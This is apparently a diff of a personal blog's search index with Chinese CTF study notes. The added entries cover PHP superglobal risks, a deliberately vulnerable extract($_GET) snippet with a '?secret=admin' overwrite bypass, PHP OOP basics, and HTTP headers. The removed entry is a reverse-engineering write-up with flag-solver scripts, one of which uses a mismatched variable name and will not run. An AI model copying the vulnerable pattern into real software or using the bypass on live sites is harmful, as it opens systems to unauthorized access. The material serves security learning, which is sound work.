+$_REQUEST
+GET+POST+Cookie
+参数来源混乱，易绕过
+
+
+$_COOKIE
+Cookie
+认证伪造、反序列化
+
+
+$_SESSION
+会话
+会话固定、会话劫持
+
+
+$_SERVER
+服务器信息
+信息泄露、HTTP_* 头伪造
+
+
+$_FILES
+上传文件
+文件上传漏洞
+
+
+$GLOBALS
+全局变量
+变量覆盖
+
+
+
+
+函数PHP中的一些危险函数
+上文中是一些在CTF中出现的一些可能会导致漏洞危险函数
+这里便不再赘述了，因为只学原理不实践的话也没什么意义，所以我选择边实践边学习，遇到了再学
+这里先把extract()学习一下
+extract($_GET)作用是 将GET请求的参数直接解析为变量并覆盖原有变量；
+&lt;?php$flag = &quot;xxxxxxxxxxxx&quot;;extract($_GET);if($secret == &quot;admin&quot;)&#123;echo $flag;&#125;else&#123;echo &quot;Access Denied&quot;;&#125;?&gt;
+
+正常代码无法直接控制 $secret，但是 extract() 会自动创建&#x2F;覆盖任意变量。也就是说：我们在URL传什么参数，服务器就会生成什么变量。
+这里extract接收GET的参数，由于这个函数可以直接覆盖GET到的参数，所以就直接可以在url中加上?secret=admin可以直接覆盖掉原本的参数，直接就可以输出flag
+面向对象可以把它们串成一条线来理解：类定义对象有哪些数据和行为；序列化保存对象的数据；反序列化恢复对象。如果恢复的数据由外部控制，而对象又会自动执行某些操作，就可能产生漏洞。
+这里来学习面向对象,用一下菜鸟教程中的一个汽车的例子
+&lt;?phpclass Car &#123;    public $color;    public function __construct($color = &quot;green&quot;)    &#123;        $this-&gt;color = $color;    &#125;    public function describe()    &#123;        return &quot;汽车的颜色是：&quot; . $this-&gt;color;    &#125;&#125;$car = new Car(&quot;white&quot;);echo $car-&gt;describe();?&gt;
+
+这是程序执行之后的结果
+
+这里开始一段一段的分析代码
+class car  定义一个类car，也就相当于car的设计图
+public $color 在类中声明一个名为 color 的公开属性，用于保存每个对象的颜色,也就相当于规定了在Car中都需要有color（颜色）这个属性，意思就是汽车的设计图中得设计一下颜色
+function describe() 在类中定义的一个方法，这个方法的作用就是描述一下这个车的颜色是什么
+$this 表示目前操作的对象，可能也能想象成英语中的代词哈哈
+$car = new Car(&quot;white&quot;)这个代码很关键，这里原本的含义是new一个新对象,用通俗的话来讲就是让工厂按照 Car 这份设计图，生产一辆新车，并在生产时指定颜色为白色，再用 $car 指代这辆车。
+学习反序列化之前，先学习一下__construct()
+__construct() 魔术方法-构造方法 使用 new 创建对象时，PHP 会自动调用它，用来设置对象的初始状态
+这个可以这样理解
+new Car(&quot;white&quot;)       ↓创建一个 Car 对象       ↓自动调用 __construct(&quot;white&quot;)       ↓参数 $color 得到 &quot;white&quot;       ↓$this-&gt;color = $color       ↓新对象的颜色被设置为 &quot;white&quot;
+
+当然，在类和对象中，这个方法也不是必须有的，下面再看一个例子
+class Car&#123;    public $color;&#125;// 没有构造方法，照样可以创建对象$car = new Car();// 创建后，再设置颜色$car-&gt;color = &quot;white&quot;;echo $car-&gt;color; // 输出 white
+
+如果没有构造方法，只能先创建对象，然后给对象设置颜色，当然这里肯定就不能像有构造方法时候直接在new对象时候传递参数，也就是不能这样$car = new Car(&quot;white&quot;);
+当然，有了构造方法，也可以写多个参数，在这里多设置一个价格，也是可以的
+class Car&#123;    public $color;    public $price;    public function __construct($color,$price)    &#123;        $this-&gt;color = $color;        $this-&gt;price = $price;    &#125;  public function describe()    &#123;        return &quot;汽车的颜色是：&quot; . $this-&gt;color;    &#125;&#125;$car = new Car(&quot;white&quot;,1000);echo $car-&gt;color; // whiteecho $car-&gt;price; // 1000
+
+在这里简单的学完构造方法之后，还有一个自定义的方法function describe()&#96;
+在类和对象中，也可以自定义方法，在这个例子中，describe()就是我们自定义的方法，-&gt; 不仅可以用来引用类中的属性，也可以用来引用方法
+我们自定义的这个方法的含义，在这个car的例子来讲的话，可以通俗的理解为用来描述这个车的颜色
+至此为止，我们用通俗易懂的例子学习了面向对象中的类、对象、属性、方法
+再学一个新概念，继承
+例如，“电动车”也是一种“车”，可以继承 Car
+我们已经有一份汽车设计图 Car，现在想设计电动车，可以在汽车设计图的基础上增加电池等功能，不必从头设计。 这就是继承。
+class ElectricCar extends Car&#123;    public $battery;    public function __construct($color, $price, $battery)    &#123;        parent::__construct($color, $price);        $this-&gt;battery = $battery;    &#125;&#125;
+
+这里：
+
+Car 是父类。
+
+ElectricCar 是子类。
+
+extends 表示继承。
+parent::__construct($color, $price);表示：调用父类的构造方法，让它负责设置颜色和价格。
+
+
+现在电动车不仅有自己的 $battery，还可以使用继承来的公开属性和方法
+$car = new ElectricCar(&quot;white&quot;, 1000, 80);
+
+总结目前php的学习就先到这里，在函数的那个部分，等到在ctf的过程中遇到什么就学什么，然后再来补充
+]]></content>
+      <categories>
+        <category>web安全学习</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP协议学习：从请求头到响应头</title>
+    <url>/2026/10/28/http-protocol-learning/</url>
+    <content><![CDATA[本文结合 moectf 2024 的 ezhttp 题目，整理 HTTP 请求行、常见请求头、请求体，以及响应状态码和响应头。
+
+
+HTTP 请求
+HTTP 请求的第一行叫请求行，包含请求方法、请求目标和 HTTP 版本。常见方法有：
+
+GET：获取指定资源。
+POST：向服务器提交数据，常用于创建或处理资源。
+HEAD：请求与 GET 类似，但只返回响应头，不返回响应体。
+
+请求行下面是请求头，常见字段包括：
+
+Host：请求访问的主机名。
+X-Forwarded-For：代理服务器常用来传递客户端 IP。只有来自可信代理的值才应作为真实来源，因为客户端可能自行伪造它。
+Referer：表示请求从哪个页面发起。
+User-Agent：描述客户端使用的设备、操作系统和浏览器等信息。
+Content-Type：描述请求体的数据格式，例如表单或 JSON。
+
+请求头之后是请求体。题目中的请求体示例为 imoau=sb。如果提交 JSON，请求头中的 Content-Type 通常应设为 application/json；表单数据则使用对应的表单媒体类型。
+HTTP 响应
+服务器响应的第一行包含 HTTP 版本、状态码和状态描述。状态码按范围表示处理结果：
+
+1xx：信息响应，请求仍在处理中。
+2xx：请求已成功处理。
+3xx：需要重定向或进一步操作。
+4xx：请求存在问题，或服务器无法按请求提供资源。
+5xx：服务器处理请求时发生错误。
+
+常见状态码：
+
+200 OK：请求成功。
+301 Moved Permanently：资源已永久迁移，响应会提供新的地址。
+404 Not Found：服务器找不到请求的资源。
+418 I’m a teapot：一个真实定义过的状态码，源自愚人节 RFC，常作为趣味状态码出现。
+500 Internal Server Error：服务器遇到未预期的错误。
+
+响应状态行下面是响应头，常见字段包括：
+
+Server：服务器软件信息；出于安全考虑，服务器可能会隐藏或简化此字段。
+Content-Type：响应体的媒体类型，例如 text/html 或 application/json。
+Set-Cookie：让浏览器保存或更新 Cookie。
+Content-Length：响应体的长度（以字节计，具体行为也受传输方式影响）。
+
+响应头之后是响应体，通常包含浏览器最终显示的页面内容或接口返回的数据。
+]]></content>
+      <categories>
+        <category>web安全学习</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>CTF</tag>
+        <tag>HTTP</tag>
       </tags>
   </entry>
   <entry>
@@ -1469,102 +2036,5 @@ Less - 10时间盲注，闭合方式和9不一样而已
         <tag>SQL注入</tag>
         <tag>MySQL</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>基础逆向分析学习</title>
-    <url>/2026/10/16/reverse-engineering-basics/</url>
-    <content><![CDATA[本文整理 Android 注册逻辑、Java 解密、ELF 与 Windows 程序等基础逆向分析题目的思路和脚本。
-
-
-基本函数char *strcat(char *dest, const char *src) 把 src 所指向的字符串追加到 dest 所指向的字符串的结尾。
-简单注册器刚接触到安卓逆向，用jdx打开apk包发现注册逻辑
-
-编写exp：
-x = list(&#x27;dd2940c04462b4dd7c450528835cca15&#x27;)x[2] = chr(ord(x[2]) + ord(x[3]) - 50)x[4] = chr(ord(x[2]) + ord(x[5]) - 48)x[30] = chr(ord(x[31]) + ord(x[9]) - 48)x[14] = chr(ord(x[27]) + ord(x[28]) - 97)for i in range(0,16):    a = x[31 - i ]    x[31 - i] = x[i]    x[i] = a print(&quot;flag&#123;&quot; + &quot;&quot;.join(x) + &quot;&#125;&quot;)
-
-获得flag为flag{59acc538825054c7de4b26440c0999dd}
-JAVA逆向解密
-看  Encrypt（）的逻辑，flag作为参数传入
-for (char c : arr) &#123;            int result = (c + &#x27;@&#x27;) ^ 32;            Resultlist.add(Integer.valueOf(result));        &#125;
-
-这是加密的主要逻辑
-逆向一下加密逻辑就是
-c &#x3D; result ^ 32 - ord(‘@’)
-后面使用KEY来做对比
-所以编写脚本
-KEY = [180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65]result = &quot;&quot;for value in KEY:    value = value ^ 32    value = value - 64    cha = chr(value)    result = result + chaprint(&quot;flag&#123;&quot;+result+&quot;&#125;&quot;)
-
-flag{This_is_the_flag_!}
-luck_guy解压之后先查壳，发现无壳，是ELF64位文件
-
-将luck_guy拖进IDA中分析
-
-发现是switch-case函数，逐个分析一下每一个case
-case1的作用是先将s设置为空，将f1和f2都链接在s之后，那么s可能就是要找的flag，点击了一下f1，发现了f1的值
-
-case2和case3 都是输出，先不管
-case4这里给了 s &#x3D; ‘\x7Ffoguci&#39; ,刚开始查文件时候说了是ELF64文件，所以它存储的时候是小端存储，但是在IDA的显示中会变为大端存储，所以需要把s逆置一下，也就是s = icugof,然后会把s插入f2之后
-Case5是对f2进行处理，这个循环的含义是如果j为奇数，就把f2 - 2，如果是偶数，就把f2 - 1
-所以可以猜想一下，case4 -&gt; case5 -&gt; case1 就可以得到flag
-编写脚本走一圈
-f1 =list(&#x27;GXY&#123;do_not_&#x27;)f2 =list(&#x27;icug`of&#x27;)for i in range(0,7):    if i % 2 == 0:        f2[i] = chr(ord(f2[i]) - 1)    else:        f2[i] = chr(ord(f2[i]) - 2)print(&quot;&quot;.join(f1)+&quot;&quot;.join(f2)+&quot;&#125;&quot;)
-
-得到flag
-GXY{do_not_hate_me}
-刮开有奖先查壳，没什么有效信息
-
-直接丢IDA，看到DIalogFunc直接跟进去
-
-这里大概就能看到加密的主体了，将这些东西都修复了就变成这样了
-
-第一点，输入字符的长度必须是8
-第二点，下面的这些变量肯定是和flag有关
-跟进sub_4010f0函数
-
-发现函数是升序的快速排序，给函数更一下名
-那么意思就是将上面的变量进行升序排序
-key = list(&quot;ZJSECaNH3ng&quot;)key.sort()print(&quot;&quot;.join(key))# 3CEHJNSZagn
-
-
-
-再往下看sub_401000函数，跟进去
-
-观察函数逻辑，发现是base64加密，跟进去byte_407830中，看一下base64表是没有变的
-在主函数的逻辑中，v4 v5都是被base64加密之后的变量
-最后看if的判断条件
-
-排序后的元素为3CEHJNSZagn
-1️⃣v7[0]表示的是第一个元素 也就是3 ，string[0] &#x3D; v7[0] + 34
-2️⃣v10代表的是第五个元素 对应的也就是J 
-3️⃣逆运算一下 string[2] &#x3D; (3 * v8 + 141) &#x2F; 4,这里的v8是第三个元素，也就是E
-4️⃣逆运算一下 string[3] &#x3D; 2 * (v13 &#x2F; 9) * 4,这里的v13是第八个元素 ，也就是Z
-5️⃣6️⃣都是做比较，将ak1w和V1Ax base64解密一下再做比较，因为上面说过了 v4 v5都是base64加密之后的变量，解密之后为ak1w -&gt; jMp V1Ax -&gt; WP1
-从上往下求一下
-key = &quot;3CEHJNSZagn&quot;string0 = chr(ord(key[0]) + 34)string1 = key[4]string2 = chr(int((3 * ord(key[2]) + 141) / 4))string3 = chr(int(ord(key[7]) / 9 * 2 * 4))print(string0 + string1 + string2 + string3)
-
-得到UJWP，因为已知长度是8，上面两个字符串base64解密后为jMp和 WP1,做一下比较可以得到WP1在前面
-所以flag为flag{UJWP1jMp}
-[BJDCTF2020]JustRE进去之后查看字符串，发现一个和flag很像的东西，跟进去
-
- 
-发现点击次数为19999输出flag，再往下看format，把19999和0带入进去得到flag
-flag{1999902069a45792d233ac}
-romemiwen = [&#x27;p&#x27;, &#x27;v&#x27;, &#x27;k&#x27;, &#x27;q&#x27;, &#x27;&#123;&#x27;, &#x27;m&#x27;, &#x27;1&#x27;, &#x27;6&#x27;, &#x27;4&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;2&#x27;, &#x27;6&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;l&#x27;, &#x27;4&#x27;, &#x27;m&#x27;, &#x27;4&#x27;, &#x27;9&#x27;, &#x27;l&#x27;, &#x27;n&#x27;, &#x27;p&#x27;, &#x27;7&#x27;, &#x27;p&#x27;, &#x27;9&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;2&#x27;, &#x27;8&#x27;, &#x27;k&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;&#125;&#x27;]mingwen = [&#x27;&#x27;] * 38for i in range(0,38):    if (miwen[i] &gt;= &#x27;A&#x27; and miwen[i] &lt;= &#x27;Z&#x27;) or (miwen[i] &gt;= &#x27;a&#x27; and miwen[i] &lt;= &#x27;z&#x27;):        y = ord(miwen[i]) + 16        if (y &gt; ord(&#x27;Z&#x27;) and y &lt; ord(&#x27;a&#x27;)) or (y &gt;= ord(&#x27;z&#x27;)):            y -= 26        mingwen[i] = chr(y)    else:        mingwen[i] = miwen[i]print(&quot;&quot;.join(mingwen))print(mingwen)
-
-[GWCTF 2019]pyre拿到题目反编译后得到这样的python代码
-
-分析第二个循环一下能够知道，反着算就行，code的最后一位是不变的
-由于最后一位code[i + 1]没变，从后往前走，code[i + 1] ^ code [i]得到的就是异或前的code[i]
-从后往前异或完得到的就是num
-然后分析第一个循环
-num &#x3D; (input[i] + i) % 128
-反着算就是flag
-num &#x3D; (input[i] - i) % 128
-编写exp
-code = [&#x27;\x1f&#x27;,&#x27;\x12&#x27;,&#x27;\x1d&#x27;,&#x27;(&#x27;,&#x27;0&#x27;,&#x27;4&#x27;,&#x27;\x01&#x27;,&#x27;\x06&#x27;,&#x27;\x14&#x27;,&#x27;4&#x27;,&#x27;,&#x27;,&#x27;\x1b&#x27;,&#x27;U&#x27;,&#x27;?&#x27;,&#x27;o&#x27;,&#x27;6&#x27;,&#x27;*&#x27;,&#x27;:&#x27;,&#x27;\x01&#x27;,&#x27;D&#x27;,&#x27;;&#x27;,&#x27;%&#x27;,&#x27;\x13&#x27;]len = len(code)flag = &#x27;&#x27;for i in range(len - 2, -1, -1):    code[i] = chr(ord(code[i]) ^ ord(code[i + 1]))for i in range(len):    flag += chr((ord(code[i]) - i )% 128)print(flag)
-]]></content>
-      <categories>
-        <category>逆向学习</category>
-      </categories>
   </entry>
 </search>
